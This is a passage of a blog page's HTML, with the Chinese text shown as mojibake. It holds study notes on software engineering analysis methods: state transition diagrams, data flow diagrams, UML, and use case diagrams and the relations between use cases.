href="#æ•°æ®æ¨¡å‹-å®ä½“å…³ç³»å›¾" class="headerlink" title="æ•°æ®æ¨¡å‹-å®ä½“å…³ç³»å›¾"></a>æ•°æ®æ¨¡å‹-å®ä½“å…³ç³»å›¾</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104185604515.png" alt="image-20240104185604515" style="zoom: 50%;" /><h3 id="è¡Œä¸ºæ¨¡å‹-çŠ¶æ€è½¬æ¢å›¾"><a href="#è¡Œä¸ºæ¨¡å‹-çŠ¶æ€è½¬æ¢å›¾" class="headerlink" title="è¡Œä¸ºæ¨¡å‹-çŠ¶æ€è½¬æ¢å›¾"></a>è¡Œä¸ºæ¨¡å‹-çŠ¶æ€è½¬æ¢å›¾</h3><p>**çŠ¶æ€è½¬æ¢å›¾(çŠ¶æ€å›¾)**é€šè¿‡æç»˜ç³»ç»Ÿçš„çŠ¶æ€åŠå¼•èµ·ç³»ç»ŸçŠ¶æ€è½¬æ¢çš„äº‹ä»¶ï¼Œæ¥è¡¨ç¤ºç³»ç»Ÿçš„è¡Œä¸ºã€‚</p><h4 id="çŠ¶æ€"><a href="#çŠ¶æ€" class="headerlink" title="çŠ¶æ€"></a>çŠ¶æ€</h4><p>ä¸€ä¸ªçŠ¶æ€ä»£è¡¨ç³»ç»Ÿçš„ä¸€ç§è¡Œä¸ºæ¨¡å¼ã€‚</p><p>åœ¨çŠ¶æ€å›¾ä¸­å®šä¹‰çš„çŠ¶æ€ä¸»è¦æœ‰ï¼šåˆæ€ï¼Œç»ˆæ€å’Œä¸­é—´çŠ¶æ€ã€‚ä¸€å¼ çŠ¶æ€å›¾é‡Œé¢åªæœ‰ä¸€ä¸ªåˆæ€ï¼Œå¯ä»¥æœ‰0è‡³å¤šä¸ªç»ˆæ€ã€‚</p><h4 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h4><p>äº‹ä»¶æ˜¯åœ¨æŸä¸ªç‰¹å®šæ—¶åˆ»å‘ç”Ÿçš„äº‹æƒ…ï¼Œå®ƒæ˜¯å¯¹å¼•èµ·ç³»ç»ŸåšåŠ¨ä½œæˆ–ï¼ˆå’Œï¼‰ä»ä¸€ä¸ªçŠ¶æ€è½¬æ¢åˆ°å¦ä¸€ä¸ªçŠ¶æ€çš„å¤–ç•Œäº‹ä»¶çš„æŠ½è±¡ã€‚ä¾‹å¦‚ï¼Œå†…éƒ¨æ—¶é’Ÿè¡¨æ˜æŸä¸ªè§„å®šçš„æ—¶é—´æ®µå·²ç»è¿‡å»ï¼Œç”¨æˆ·ç§»åŠ¨é¼ æ ‡ã€ç‚¹å‡»é¼ æ ‡ç­‰éƒ½æ˜¯äº‹ä»¶ã€‚</p><p>ç®€è€Œè¨€ä¹‹ï¼Œäº‹ä»¶å°±æ˜¯<strong>å¼•èµ·ç³»ç»ŸåšåŠ¨ä½œæˆ–ï¼ˆå’Œï¼‰è½¬æ¢çŠ¶æ€çš„æ§åˆ¶ä¿¡æ¯</strong>ã€‚</p><h4 id="ç¬¦å·"><a href="#ç¬¦å·" class="headerlink" title="ç¬¦å·"></a>ç¬¦å·</h4><p>åœ¨çŠ¶æ€å›¾ä¸­ï¼Œåˆæ€ç”¨<strong>å®å¿ƒåœ†</strong>è¡¨ç¤ºï¼Œç»ˆæ€ç”¨ä¸€å¯¹<strong>åŒå¿ƒåœ†</strong>ï¼ˆå†…åœ†ä¸ºå®å¿ƒåœ†ï¼‰è¡¨ç¤ºã€‚ä¸­é—´çŠ¶æ€ç”¨åœ†è§’çŸ©å½¢è¡¨ç¤ºï¼Œå¯ä»¥ç”¨ä¸¤æ¡æ°´å¹³æ¨ªçº¿æŠŠå®ƒåˆ†æˆä¸Šã€ä¸­ã€ä¸‹3ä¸ªéƒ¨åˆ†ã€‚ä¸Šé¢éƒ¨åˆ†ä¸º<strong>çŠ¶æ€çš„åç§°</strong>ï¼Œè¿™éƒ¨åˆ†æ˜¯å¿…é¡»æœ‰çš„ï¼›ä¸­é—´éƒ¨åˆ†ä¸ºçŠ¶æ€å˜é‡çš„åå­—å’Œå€¼ï¼Œè¿™éƒ¨åˆ†æ˜¯å¯é€‰çš„ï¼›ä¸‹é¢éƒ¨åˆ†æ˜¯<strong>æ´»åŠ¨è¡¨</strong>ï¼Œè¿™éƒ¨åˆ†ä¹Ÿæ˜¯å¯é€‰çš„ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104190449273.png" alt="image-20240104190449273" style="zoom:50%;" /><h3 id="ç»“æ„åŒ–åˆ†æè¿‡ç¨‹"><a href="#ç»“æ„åŒ–åˆ†æè¿‡ç¨‹" class="headerlink" title="ç»“æ„åŒ–åˆ†æè¿‡ç¨‹"></a>ç»“æ„åŒ–åˆ†æè¿‡ç¨‹</h3><p>&#x3D;&#x3D;â‘ å»ºç«‹ç³»ç»Ÿçš„åŠŸèƒ½æ¨¡å‹&#x3D;&#x3D;</p><p>ä½¿ç”¨çš„å·¥å…·ä¸º<strong>æ•°æ®æµå›¾DFD</strong></p><ul><li>ç®€å†ç³»ç»Ÿç¯å¢ƒå›¾(é¡¶å±‚æ•°æ®æµå›¾)ç¡®å®šç³»ç»Ÿè¾¹ç•Œ</li><li>è‡ªé¡¶å‘ä¸‹ï¼Œé€æ­¥æ±‚ç²¾ï¼Œå»ºç«‹ç³»ç»Ÿçš„å±‚æ¬¡æ•°æ®æµå›¾</li></ul><p>&#x3D;&#x3D;â‘¡å»ºç«‹æ•°æ®å­—å…¸&#x3D;&#x3D;</p><p>ä½¿ç”¨çš„å·¥å…·ä¸ºç»“æ„ç¬¦ï¼š<strong>â€œ+ã€|ã€{ }â€œ</strong>ç­‰</p><p>å®šä¹‰æ•°æ®æµ</p><p>å®šä¹‰æ•°æ®å­˜å‚¨</p><p>å®šä¹‰æ•°æ®é¡¹</p><p>&#x3D;&#x3D;â‘¢ç»™å‡ºåŠ å·¥å°è¯´æ˜&#x3D;&#x3D;</p><p>ä½¿ç”¨çš„å·¥å…·å¯ä»¥æ˜¯<strong>ç»“æ„åŒ–è‡ªç„¶è¯­è¨€ã€åˆ¤å®šè¡¨ã€åˆ¤å®šæ ‘</strong></p><p>é›†ä¸­æè¿°ä¸€ä¸ªåŠ å·¥â€œåšä»€ä¹ˆâ€ï¼Œå³åŠ å·¥é€»è¾‘ï¼Œä¹Ÿä¿ç½—å…¶ä»–ä¸€äº›ä¸åŠ å·¥æœ‰å…³çš„ä¿¡æ¯ï¼Œå¦‚æ‰§è¡Œæ¡ä»¶ã€ä¼˜å…ˆçº§ã€æ‰§è¡Œé¢‘ç‡ã€å‡ºé”™å¤„ç†ç­‰</p><h3 id="åŠŸèƒ½æ¨¡å‹-æ•°æ®æµå›¾"><a href="#åŠŸèƒ½æ¨¡å‹-æ•°æ®æµå›¾" class="headerlink" title="åŠŸèƒ½æ¨¡å‹-æ•°æ®æµå›¾"></a>åŠŸèƒ½æ¨¡å‹-æ•°æ®æµå›¾</h3><h4 id="æ•°æ®æµå›¾ä¸­çš„ä¸»è¦å›¾å½¢å…ƒç´ "><a href="#æ•°æ®æµå›¾ä¸­çš„ä¸»è¦å›¾å½¢å…ƒç´ " class="headerlink" title="æ•°æ®æµå›¾ä¸­çš„ä¸»è¦å›¾å½¢å…ƒç´ "></a>æ•°æ®æµå›¾ä¸­çš„ä¸»è¦å›¾å½¢å…ƒç´ </h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104191053076.png" alt="image-20240104191053076" style="zoom:50%;" /><h4 id="æ•°æ®æµå›¾å®ä¾‹"><a href="#æ•°æ®æµå›¾å®ä¾‹" class="headerlink" title="æ•°æ®æµå›¾å®ä¾‹"></a>æ•°æ®æµå›¾å®ä¾‹</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104191125161.png" alt="image-20240104191125161" style="zoom:50%;" /><h4 id="æ•°æ®æµå›¾å±‚æ¬¡ç»“æ„"><a href="#æ•°æ®æµå›¾å±‚æ¬¡ç»“æ„" class="headerlink" title="æ•°æ®æµå›¾å±‚æ¬¡ç»“æ„"></a>æ•°æ®æµå›¾å±‚æ¬¡ç»“æ„</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104191406586.png" alt="image-20240104191406586" style="zoom:50%;" /><h4 id="åŠ å·¥"><a href="#åŠ å·¥" class="headerlink" title="åŠ å·¥"></a>åŠ å·¥</h4><ul><li>è¡¨ç¤ºå¯¹æ•°æ®è¿›è¡Œçš„æ“ä½œï¼Œå¦‚â€œå¤„ç†é€‰è¯¾å•â€ï¼Œâ€œäº§ç”Ÿå‘ç¥¨â€ç­‰</li><li>åŠ å·¥çš„ç¼–å·ï¼Œè¯´æ˜è¿™ä¸ªåŠ å·¥åœ¨å±‚æ¬¡åˆ†è§£ä¸­çš„ä½ç½®</li></ul><h4 id="å¤–éƒ¨å®ä½“ï¼ˆæ•°æ®æºç‚¹-ç»ˆç‚¹ï¼‰"><a href="#å¤–éƒ¨å®ä½“ï¼ˆæ•°æ®æºç‚¹-ç»ˆç‚¹ï¼‰" class="headerlink" title="å¤–éƒ¨å®ä½“ï¼ˆæ•°æ®æºç‚¹&#x2F;ç»ˆç‚¹ï¼‰"></a>å¤–éƒ¨å®ä½“ï¼ˆæ•°æ®æºç‚¹&#x2F;ç»ˆç‚¹ï¼‰</h4><ul><li>ä½äºç³»ç»Ÿä¹‹å¤–çš„ä¿¡æ¯æä¾›è€…æˆ–ä½¿ç”¨è€…,ç§°ä¸ºå¤–éƒ¨å®ä½“ã€‚å³å­˜åœ¨äºç³»ç»Ÿä¹‹å¤–çš„äººå‘˜æˆ–ç»„ç»‡ã€‚å¦‚â€œå­¦åŠ¡ç§‘â€ç­‰</li><li>è¯´æ˜æ•°æ®è¾“å…¥çš„æºç‚¹(æ•°æ®æº)æˆ–æ•°æ®è¾“å‡ºçš„ç»ˆç‚¹(æ•°æ®ç»ˆç‚¹)</li><li>èµ·åˆ°æ›´å¥½çš„ç†è§£ä½œç”¨ï¼Œä½†ä¸æ˜¯ç³»ç»Ÿä¸­çš„äº‹ç‰©</li></ul><h4 id="æ•°æ®æµ"><a href="#æ•°æ®æµ" class="headerlink" title="æ•°æ®æµ"></a>æ•°æ®æµ</h4><ul><li>è¡¨ç¤ºæ•°æ®å’Œæ•°æ®æµå‘, ç”±ä¸€ç»„å›ºå®šæˆåˆ†çš„æ•°æ®ç»„æˆã€‚å¦‚â€œé€‰è¯¾å•â€ç”±â€œå­¦å·ã€å§“åã€è¯¾ç¨‹ç¼–å·ã€è¯¾ç¨‹åâ€ç­‰æˆåˆ†ç»„æˆ</li><li>æ•°æ®æµå¯ä»åŠ å·¥æµå‘åŠ å·¥ï¼Œä¹Ÿå¯åœ¨åŠ å·¥ä¸æ•°æ®å­˜å‚¨æˆ–å¤–éƒ¨é¡¹ä¹‹é—´æµåŠ¨ï¼›ä¸¤ä¸ªåŠ å·¥ä¹‹é—´å¯æœ‰å¤šè‚¡æ•°æ®æµ</li></ul><h4 id="æ•°æ®æµä¸æ•°æ®åŠ å·¥ä¹‹é—´å…³ç³»"><a href="#æ•°æ®æµä¸æ•°æ®åŠ å·¥ä¹‹é—´å…³ç³»" class="headerlink" title="æ•°æ®æµä¸æ•°æ®åŠ å·¥ä¹‹é—´å…³ç³»"></a>æ•°æ®æµä¸æ•°æ®åŠ å·¥ä¹‹é—´å…³ç³»</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104191844822.png" alt="image-20240104191844822" style="zoom:50%;" /><h4 id="ç”»åˆ†å±‚æ•°æ®æµå›¾çš„æ­¥éª¤"><a href="#ç”»åˆ†å±‚æ•°æ®æµå›¾çš„æ­¥éª¤" class="headerlink" title="ç”»åˆ†å±‚æ•°æ®æµå›¾çš„æ­¥éª¤"></a>ç”»åˆ†å±‚æ•°æ®æµå›¾çš„æ­¥éª¤</h4><p><strong>ç¬¬ä¸€æ­¥ï¼šç”»ç³»ç»Ÿçš„è¾“å…¥å’Œè¾“å‡ºï¼ˆç”»å‡ºé¡¶å±‚å›¾ï¼‰</strong></p><p><strong>ç¬¬äºŒæ­¥ï¼šç”»ç³»ç»Ÿå†…éƒ¨</strong></p><p><strong>ç¬¬ä¸‰æ­¥ï¼šç”»åŠ å·¥å†…éƒ¨</strong></p><p><strong>ç¬¬å››æ­¥ï¼šé‡å¤ç¬¬3æ­¥ï¼Œç›´è‡³æ¯ä¸ªå°šæœªåˆ†è§£çš„åŠ å·¥éƒ½è¶³å¤Ÿç®€å•(å³ä¸å¿…å†åˆ†è§£)</strong></p><h2 id="é¢å‘å¯¹è±¡çš„åˆ†ææ–¹æ³•"><a href="#é¢å‘å¯¹è±¡çš„åˆ†ææ–¹æ³•" class="headerlink" title="é¢å‘å¯¹è±¡çš„åˆ†ææ–¹æ³•"></a>é¢å‘å¯¹è±¡çš„åˆ†ææ–¹æ³•</h2><p>â€‹â€”â€”ä¸€ç‰¹å®šçš„è½¯ä»¶å¼€å‘æ–¹æ³•å­¦</p><p>é¢å‘å¯¹è±¡æ–¹æ³•æ˜¯ä¸€ç§ä»¥å¯¹è±¡ã€å¯¹è±¡å…³ç³»ç­‰æ¥æ„é€ è½¯ä»¶ç³»ç»Ÿæ¨¡å‹çš„ç³»ç»ŸåŒ–æ–¹æ³•ã€‚</p><p>é¢å‘å¯¹è±¡æ–¹æ³•çš„ä¸–ç•Œè§‚ï¼šä¸€åˆ‡ç³»ç»Ÿéƒ½æ˜¯ç”±å¯¹è±¡æ„æˆã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104192216887.png" alt="image-20240104192216887" style="zoom:50%;" /><ul><li>é¢å‘å¯¹è±¡çš„åˆ†æ(OOA)</li><li>é¢å‘å¯¹è±¡çš„è®¾è®¡(OOD)</li><li>é¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡(OOP)</li></ul><h4 id="è‘—åé¢å‘å¯¹è±¡æ–¹æ³•"><a href="#è‘—åé¢å‘å¯¹è±¡æ–¹æ³•" class="headerlink" title="è‘—åé¢å‘å¯¹è±¡æ–¹æ³•"></a>è‘—åé¢å‘å¯¹è±¡æ–¹æ³•</h4><ul><li>Booch æ–¹æ³•ï¼ˆ 1991 )</li><li>Coad ä¸€ Yourdon æ–¹æ³•ï¼ˆ 1991 )</li><li>Rumbaugh æ–¹æ³•ï¼ˆç®€ç§° OMT ) ( object Modeling Technology 1991 )</li><li>Jacobson æ–¹æ³•ï¼ˆç®€ç§° OOSE , 1992 )</li><li>ç”± Rumbaugh ã€ Booch ã€ Jacobson æå‡ºçš„<strong>ç»Ÿä¸€å»ºæ¨¡è¯­è¨€ ( ç®€ç§°UML )</strong> ( Unify Modeling Language ï¼Œ1994 )</li></ul><h3 id="UML"><a href="#UML" class="headerlink" title="UML"></a>UML</h3><h4 id="ç‰¹ç‚¹-2"><a href="#ç‰¹ç‚¹-2" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h4><ul><li>ç»Ÿä¸€æ ‡å‡†ï¼šå·²æˆä¸ºé¢å‘å¯¹è±¡çš„æ ‡å‡†åŒ–çš„ç»Ÿä¸€çš„å»ºæ¨¡è¯­è¨€</li><li>é¢å‘å¯¹è±¡</li><li>å¯è§†åŒ–ï¼Œè¡¨ç¤ºèƒ½åŠ›å¼ºå¤§</li><li>ç‹¬ç«‹äºè¿‡ç¨‹</li><li>æ¦‚å¿µæ˜ç¡®ï¼Œå»ºæ¨¡è¡¨ç¤ºç®€æ´ï¼Œå®¹æ˜“æŒæ¡ä½¿ç”¨</li></ul><h4 id="æ”¯æŒ-1"><a href="#æ”¯æŒ-1" class="headerlink" title="æ”¯æŒ"></a>æ”¯æŒ</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104192723959.png" alt="image-20240104192723959" style="zoom:50%;" /><h4 id="è½¯ä»¶å¼€å‘æ¨¡å‹"><a href="#è½¯ä»¶å¼€å‘æ¨¡å‹" class="headerlink" title="è½¯ä»¶å¼€å‘æ¨¡å‹"></a>è½¯ä»¶å¼€å‘æ¨¡å‹</h4><p>&#x3D;&#x3D;æ•°æ®æ¨¡å‹(å¯¹è±¡æ¨¡å‹)&#x3D;&#x3D;</p><p>æè¿°ç³»ç»Ÿæ•°æ®ç»“æ„çš„å¯¹è±¡æ¨¡å‹ï¼›</p><p>&#x3D;&#x3D;è¡Œä¸ºæ¨¡å‹(åŠ¨æ€æ¨¡å‹)&#x3D;&#x3D;</p><p>æè¿°ç³»ç»Ÿæ§åˆ¶ç»“æ„</p><p>&#x3D;&#x3D;åŠŸèƒ½æ¨¡å‹&#x3D;&#x3D;</p><p>æè¿°ç³»ç»ŸåŠŸèƒ½</p><blockquote><p>ä¸€ä¸ªå…¸å‹çš„è½¯ä»¶ç³»ç»Ÿä½¿ç”¨æ•°æ®ç»“æ„ï¼ˆæ•°æ®æ¨¡å‹ï¼‰ï¼Œæ‰§è¡Œæ“ä½œï¼ˆè¡Œä¸ºæ¨¡å‹ï¼‰ï¼Œå¹¶ä¸”å®Œæˆæ•°æ®å€¼çš„å˜åŒ–ï¼ˆåŠŸèƒ½æ¨¡å‹ï¼‰</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104193115544.png" alt="image-20240104193115544" style="zoom: 33%;" /><h3 id="åŠŸèƒ½æ¨¡å‹â€”â€”ç”¨ä¾‹å›¾"><a href="#åŠŸèƒ½æ¨¡å‹â€”â€”ç”¨ä¾‹å›¾" class="headerlink" title="åŠŸèƒ½æ¨¡å‹â€”â€”ç”¨ä¾‹å›¾"></a>åŠŸèƒ½æ¨¡å‹â€”â€”ç”¨ä¾‹å›¾</h3><h4 id="åŸºæœ¬å›¾å½¢ç¬¦å·"><a href="#åŸºæœ¬å›¾å½¢ç¬¦å·" class="headerlink" title="åŸºæœ¬å›¾å½¢ç¬¦å·"></a>åŸºæœ¬å›¾å½¢ç¬¦å·</h4><p>ç”¨ä¾‹å»ºæ¨¡ç”¨äºæè¿°ç³»ç»Ÿéœ€æ±‚ï¼ŒæŠŠç³»ç»Ÿå½“ä½œé»‘ç›’ï¼Œä»ç”¨æˆ·çš„è§’åº¦ï¼Œæè¿°ç³»ç»Ÿçš„åœºæ™¯ã€‚ä¸»è¦å›¾å½¢å…ƒç´ æœ‰ä»¥ä¸‹å‡ ä¸ª</p><ul><li>&#x3D;&#x3D;å‚ä¸è€…&#x3D;&#x3D;ï¼šæ˜¯æŒ‡å¤–éƒ¨ç”¨æˆ·æˆ–å¤–éƒ¨å®ä½“åœ¨ç³»ç»Ÿä¸­æ‰®æ¼”çš„è§’è‰²ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªäººã€ä¸€ä¸ªè®¡ç®—æœºå­ç³»ç»Ÿã€ç¡¬ä»¶è®¾å¤‡æˆ–è€…æ—¶é—´ç­‰è§’è‰²</li><li>&#x3D;&#x3D;ç”¨ä¾‹&#x3D;&#x3D;ï¼šå¯¹ä¸€ç»„åŠ¨ä½œåºåˆ—çš„æè¿°ï¼Œç³»ç»Ÿé€šè¿‡æ‰§è¡Œè¿™ä¸€ç»„åŠ¨ä½œåºåˆ—ä¸ºå‚ä¸è€…äº§ç”Ÿä¸€ä¸ªå¯è§‚å¯Ÿçš„ç»“æœã€‚ç”¨ä¾‹åå¾€å¾€ç”¨åŠ¨å®¾ç»“æ„å‘½åã€‚</li><li>&#x3D;&#x3D;æ‰§è¡Œå…³è”&#x3D;&#x3D;ï¼šå‚ä¸è€…ï¼ˆActor ï¼‰æ‰§è¡Œç”¨ä¾‹ï¼ˆUse Caseï¼‰ä¹‹é—´çš„å…³ç³»</li></ul><h4 id="å‚ä¸è€…-Actor"><a href="#å‚ä¸è€…-Actor" class="headerlink" title="å‚ä¸è€…(Actor)"></a>å‚ä¸è€…(Actor)</h4><ul><li>å‚ä¸è€…(actor)æŒ‡ç³»ç»Ÿä»¥å¤–çš„ã€éœ€è¦ä½¿ç”¨ç³»ç»Ÿæˆ–ä¸ç³»ç»Ÿäº¤äº’çš„ä¸œè¥¿ï¼ŒåŒ…æ‹¬äººã€è®¾å¤‡ã€å¤–éƒ¨ç³»ç»Ÿç­‰</li></ul><p>è¡¨ç¤ºå½¢å¼ï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104195101811.png" alt="image-20240104195101811" style="zoom:33%;" /><h5 id="ç¡®å®šå‚ä¸è€…"><a href="#ç¡®å®šå‚ä¸è€…" class="headerlink" title="ç¡®å®šå‚ä¸è€…"></a>ç¡®å®šå‚ä¸è€…</h5><p>å¦‚é¥®æ–™è‡ªåŠ¨å”®è´§ç³»ç»Ÿï¼šå‚ä¸è€…æœ‰<strong>é¡¾å®¢ï¼Œä¾›åº”å•†å’Œæ”¶é“¶å‘˜</strong></p><h4 id="ç”¨ä¾‹-Use-Case"><a href="#ç”¨ä¾‹-Use-Case" class="headerlink" title="ç”¨ä¾‹(Use Case)"></a>ç”¨ä¾‹(Use Case)</h4><ul><li>å¯¹ä¸€ç»„åŠ¨ä½œåºåˆ—çš„æè¿°ï¼Œç³»ç»Ÿé€šè¿‡æ‰§è¡Œè¿™ä¸€ç»„åŠ¨ä½œåºåˆ—ä¸ºå‚ä¸è€…äº§ç”Ÿä¸€ä¸ªå¯è§‚å¯Ÿçš„ç»“æœ</li><li>ç”¨æ¤­åœ†å½¢è¡¨ç¤º</li></ul><p>&#x3D;&#x3D;ç‰¹å¾&#x3D;&#x3D;</p><ul><li>è¯´æ˜äº†ç³»ç»Ÿå…·æœ‰çš„ä¸€ç§è¡Œä¸ºæ¨¡å¼</li><li>è¯´æ˜äº†ä¸€ä¸ªå‚ä¸è€…ä¸ç³»ç»Ÿæ‰§è¡Œçš„ä¸€ä¸ªç›¸å…³çš„äº‹ä»¶åºåˆ—</li><li>æä¾›äº†ä¸€ç§è·å–ç³»ç»Ÿéœ€æ±‚çš„æ–¹æ³•</li><li>æä¾›äº†ä¸€ç§ä¸æœ€ç»ˆçš„<strong>ç”¨æˆ·</strong>å’Œ<strong>é¢†åŸŸä¸“å®¶</strong>è¿›è¡Œæ²Ÿé€šçš„æ–¹æ³•</li><li>æä¾›äº†ä¸€ç§<strong>æµ‹è¯•ç³»ç»Ÿ</strong>çš„æ–¹æ³•</li></ul><h5 id="è·å–ç”¨ä¾‹"><a href="#è·å–ç”¨ä¾‹" class="headerlink" title="è·å–ç”¨ä¾‹"></a>è·å–ç”¨ä¾‹</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104200939653.png" alt="image-20240104200939653" style="zoom:33%;" /><h4 id="ç³»ç»Ÿå’Œå…³è”"><a href="#ç³»ç»Ÿå’Œå…³è”" class="headerlink" title="ç³»ç»Ÿå’Œå…³è”"></a>ç³»ç»Ÿå’Œå…³è”</h4><p>&#x3D;&#x3D;ç³»ç»Ÿ&#x3D;&#x3D;ï¼šç”¨äºç•Œå®šç³»ç»ŸåŠŸèƒ½èŒƒå›´ï¼Œæè¿°è¯¥åŠŸèƒ½çš„ç”¨ä¾‹éƒ½ç½®äºå…¶ä¸­ï¼Œè€Œæè¿°å¤–éƒ¨å®ä½“çš„å‚ä¸è€…éƒ½ç½®äºå…¶å¤–</p><p>&#x3D;&#x3D;å…³è”&#x3D;&#x3D;ï¼šè¿æ¥å‚ä¸è€…ä¸ç”¨ä¾‹ï¼Œè¡¨ç¤ºå‚ä¸è€…æ‰€ä»£è¡¨çš„ç³»ç»Ÿå¤–éƒ¨å®ä½“ä¸è¯¥ç”¨ä¾‹æ‰€æè¿°çš„ç³»ç»Ÿéœ€æ±‚æœ‰å…³</p><h4 id="åˆæ­¥å®ç°"><a href="#åˆæ­¥å®ç°" class="headerlink" title="åˆæ­¥å®ç°"></a>åˆæ­¥å®ç°</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104201243414.png" alt="image-20240104201243414" style="zoom:50%;" /><p>å»ºç«‹ç”¨ä¾‹æ¨¡å‹çš„é¡ºåºæ˜¯ï¼š</p><ul><li>ç¡®å®šè°ä¼šç›´æ¥ä½¿ç”¨è¯¥ç³»ç»Ÿã€‚è¿™äº›éƒ½æ˜¯<strong>å‚ä¸è€…</strong>(Actor)ã€‚é€‰å–å…¶ä¸­ä¸€ä¸ªå‚ä¸è€…ã€‚</li><li>å®šä¹‰è¯¥å‚ä¸è€…å¸Œæœ›ç³»ç»Ÿåšä»€ä¹ˆï¼Œå‚ä¸è€…å¸Œæœ›ç³»ç»Ÿåšçš„æ¯ä»¶äº‹æˆä¸ºä¸€ä¸ª<strong>ç”¨ä¾‹</strong>ã€‚</li><li>å¯¹æ¯ä»¶äº‹æ¥è¯´ï¼Œä½•æ—¶å‚ä¸è€…ä¼šä½¿ç”¨ç³»ç»Ÿï¼Œé€šå¸¸ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œè¿™å°±æ˜¯<strong>ç”¨ä¾‹çš„åŸºæœ¬è¿‡ç¨‹</strong>ã€‚æè¿°è¯¥ç”¨ä¾‹çš„åŸºæœ¬è¿‡ç¨‹ã€‚</li></ul><h4 id="ç”¨ä¾‹æ‰©å±•"><a href="#ç”¨ä¾‹æ‰©å±•" class="headerlink" title="ç”¨ä¾‹æ‰©å±•"></a>ç”¨ä¾‹æ‰©å±•</h4><ul><li>è€ƒè™‘ä¸€äº›å¯å˜æƒ…å†µï¼ŒæŠŠä»–ä»¬åˆ›å»ºä¸ºæ‰©å±•ç”¨ä¾‹</li><li>å¤å®¡ä¸åŒç”¨ä¾‹çš„æè¿°ï¼Œæ‰¾å‡ºå…¶ä¸­çš„ç›¸åŒç‚¹ï¼ŒæŠ½å‡ºç›¸åŒç‚¹ä½œä¸ºå…±åŒçš„ç”¨ä¾‹</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104225702045.png" alt="image-20240104225702045" style="zoom:50%;" /><h4 id="ç”¨ä¾‹ä¹‹é—´çš„å…³ç³»"><a href="#ç”¨ä¾‹ä¹‹é—´çš„å…³ç³»" class="headerlink" title="ç”¨ä¾‹ä¹‹é—´çš„å…³ç³»"></a>ç”¨ä¾‹ä¹‹é—´çš„å…³ç³»</h4><p>&#x3D;&#x3D;æ³›åŒ–&#x3D;&#x3D;(Inheritance)</p><p>å°±æ˜¯é€šå¸¸ç†è§£çš„ç»§æ‰¿å…³ç³»ï¼Œå­ç”¨ä¾‹å’Œçˆ¶ç”¨ä¾‹ç›¸ä¼¼ï¼Œä½†è¡¨ç°å‡ºæ›´ç‰¹åˆ«çš„è¡Œä¸ºï¼›å­ç”¨ä¾‹å°†ç»§æ‰¿çˆ¶ç”¨ä¾‹çš„æ‰€æœ‰ç»“æ„ã€è¡Œä¸ºå’Œå…³ç³»ã€‚å­ç”¨ä¾‹å¯ä»¥ä½¿ç”¨çˆ¶ç”¨ä¾‹çš„ä¸€æ®µè¡Œä¸ºï¼Œä¹Ÿå¯ä»¥é‡è½½å®ƒã€‚çˆ¶ç”¨ä¾‹é€šå¸¸æ˜¯æŠ½è±¡çš„ã€‚</p><p>(å­ç”¨ä¾‹-&gt;çˆ¶ç”¨ä¾‹)</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230219431.png" alt="image-20240104230219431" style="zoom: 33%;" /><p>&#x3D;&#x3D;åŒ…å«&#x3D;&#x3D;(Include)</p><p>åŒ…å«å…³ç³»ç”¨æ¥æŠŠä¸€ä¸ªè¾ƒå¤æ‚ç”¨ä¾‹æ‰€è¡¨ç¤ºçš„åŠŸèƒ½åˆ†è§£æˆè¾ƒå°çš„æ­¥éª¤ã€‚ä¸€ä¸ªç”¨ä¾‹å¯ä»¥åŒ…å«å¦å¤–ä¸€ä¸ªç”¨ä¾‹</p><p>(å¤æ‚åŠŸèƒ½ç”¨ä¾‹-&gt;åˆ†è§£å‡ºæ¥çš„åŠŸèƒ½ç”¨ä¾‹)</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230325412.png" alt="image-20240104230325412" style="zoom: 33%;" /><p>&#x3D;&#x3D;å…³è”&#x3D;&#x3D;(Association)</p><p>è¡¨ç¤ºå‚ä¸è€…ä¸ç”¨ä¾‹ä¹‹é—´çš„é€šä¿¡ï¼Œä»»ä½•ä¸€æ–¹éƒ½å¯ä»¥å‘é€æˆ–è€…æ¥æ”¶æ¶ˆæ¯ã€‚</p><p>(å‘é€æ–¹-&gt;æ¥æ”¶æ–¹)</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230009061.png" alt="image-20240104230009061" style="zoom:33%;" /><p>æ³¨ï¼šå‚ä¸è€…å¯ä»¥å‚ä¸å¤šä¸ªç”¨ä¾‹ï¼Œç”±æ­¤å½¢æˆå­ç³»ç»Ÿ</p><p>&#x3D;&#x3D;æ‰©å±•&#x3D;&#x3D;(Extend)</p><p>æ‰©å±•å…³ç³»æ˜¯æŒ‡ç”¨ä¾‹åŠŸèƒ½çš„å»¶ä¼¸ï¼Œç›¸å½“äºä¸ºåŸºç¡€ç”¨ä¾‹æä¾›ä¸€ä¸ªé™„åŠ åŠŸèƒ½ã€‚ç”±ä¸€ä¸ªç”¨ä¾‹çš„æ‰©å±•ç‚¹å¯ä»¥æ‰©å±•å‡ºå¦å¤–ä¸€ä¸ªç”¨ä¾‹ã€‚</p><p>(æ‰©å±•ç”¨ä¾‹-&gt;åŸºç¡€ç”¨ä¾‹)</p><img 